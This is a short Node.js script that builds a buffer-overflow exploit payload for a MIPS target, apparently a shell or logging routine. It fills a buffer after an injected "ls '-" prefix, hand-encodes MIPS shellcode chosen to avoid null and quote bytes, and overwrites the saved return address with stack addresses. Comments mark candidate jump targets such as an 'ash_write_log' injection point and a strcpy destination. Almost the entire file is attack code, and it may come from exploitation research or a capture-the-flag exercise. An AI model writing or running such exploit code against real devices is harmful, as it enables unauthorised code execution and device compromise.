/// <reference types="node" />


const payload = Buffer.alloc(1121 + 4, 0x01 /** NOP */)
payload.write("ls '-", 0)

// https://www.eg.bucknell.edu/~csci320/mips_web/
/**
 * Avoid null byte 0x00 and single-quote 0x27
 * Todo: remove 0x45 at upper byte to get jump
 */
payload.writeUInt32BE(0x3c084543, 5)// lui     t0,0x4543
payload.writeUInt32BE(0x35081e78, 9)// ori     t0,t0,0x1e78

/**
 * jr t0
 * Binary: 00000001000000000000000000001000
 * Hex: 0x01000008
 * Added some junk bits to avoid null byte
 */
payload.writeUInt32BE(0b00000001000000011000000000001000, 13)

// PC/RA
//const pc = `\x00\x43\x1e\x78`
//const pc = `\x40\x7f\xed\x5f`
// const pc = `\x40\x7f\xed\x17` // paramstack + 3 (sh<space>)
const pc = Buffer.alloc(4)
// Jump to our payload ? got illegal instruction
pc.writeUInt32BE(0x407ff928 + 4)
// jump to exit
//pc.writeUInt32BE(0x3fe7da30)

//0x407ff928 --> inject on ash_write_log
// 
// paramstack (strcpy dest) is 0x407fed14

process.stdout.write(Buffer.concat([
    payload,
    pc
]), "binary")
process.stdout.write("'\n")
